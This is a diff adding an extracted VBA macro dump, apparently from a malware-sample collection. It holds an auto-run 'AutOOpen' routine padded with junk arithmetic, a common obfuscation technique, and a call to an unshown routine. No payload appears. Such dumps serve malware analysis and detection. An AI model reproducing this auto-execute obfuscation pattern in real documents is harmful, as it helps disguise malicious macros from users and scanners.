@@ -1,0 +1,20 @@
+Filename     : ./macros/cb2532cb15bc085e00958e36905e95648c320de1933cdf5bfc7df94b59e9e0cf
+OLE stream   : Macros/VBA/ThisDocument
+VBA filename : ThisDocument.cls
+----------------------------------------
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Sub AutOOpen()
+AVOGORIP = 50 + 91
+AVOGORIP = AVOGORIP * AVOGORI
+cassie688
+AVOGORIP = AVOGORIP - 44 * AVOGORIP - AVOGORIP - 6
+AVOGORIP = AVOGORIP * 100 - AVOGORI
+AVOGORIP = AVOGORIP * 7 - 56 - AVOGORI
+End Sub
